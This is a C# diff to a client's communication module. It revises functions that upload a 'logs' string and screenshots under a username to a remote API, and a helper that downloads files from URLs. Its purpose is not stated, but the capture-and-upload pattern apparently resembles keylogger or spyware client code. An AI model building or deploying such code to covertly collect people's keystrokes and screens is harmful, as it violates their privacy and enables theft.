@@ -30,11 +30,11 @@ namespace Client.Communication
                     {
                         MultipartFormDataContent form = new MultipartFormDataContent();
                         form.Add(new StringContent(logged), "logs");
-
                         HttpClient httpClient = new HttpClient();
                         httpClient.Timeout = TimeSpan.FromSeconds(10);
-                        httpClient.PostAsync($"{API}?username=\"{HttpUtility.UrlEncode(username)}\"&type=logs", form).Wait();
-                        result = true;
+                        var response = httpClient.PostAsync($"{API}?username=\"{HttpUtility.UrlEncode(username)}\"&type=logs", form).Result;
+                        Console.WriteLine(response.Content.ReadAsStringAsync().Result);
+                        result = response.IsSuccessStatusCode;
                     }
                     catch { result = false; }
                 } while (force && !result);
@@ -49,14 +49,15 @@ namespace Client.Communication
                 try
                 {
                     MultipartFormDataContent form = new MultipartFormDataContent();
-                    form.Add(new ByteArrayContent(image_buffer, 0, image_buffer.Length), "file", "file");
+                    form.Add(new ByteArrayContent(image_buffer, 0, image_buffer.Length), "file", "screenshot");
 
                     HttpClient httpClient = new HttpClient();
-                    httpClient.Timeout = TimeSpan.FromSeconds(10);
-                    httpClient.PostAsync($"{API}?username=\"{HttpUtility.UrlEncode(username)}\"&type=screenshot", form).Wait();
-                    result = true;
+                    httpClient.Timeout = TimeSpan.FromSeconds(20);
+
+                    var response = httpClient.PostAsync($"{API}?username=\"{HttpUtility.UrlEncode(username)}\"&type=screenshot", form).Result;
+                    result = response.IsSuccessStatusCode;
                 }
-                catch
+                catch (Exception ex)
                 {
                     result = false;
                 }
@@ -66,14 +67,16 @@ namespace Client.Communication
 
         public async static Task<string> AsyncDownloadFile(string url, string filename)
         {
+            string successful_filename = null;
             await Task.Run(() =>
             {
                 using (var client = new WebClient())
                 {
                     client.DownloadFile(url, filename);
+                    successful_filename = filename;
                 }
             });
-            return filename;
+            return successful_filename;
         }
     }
 }
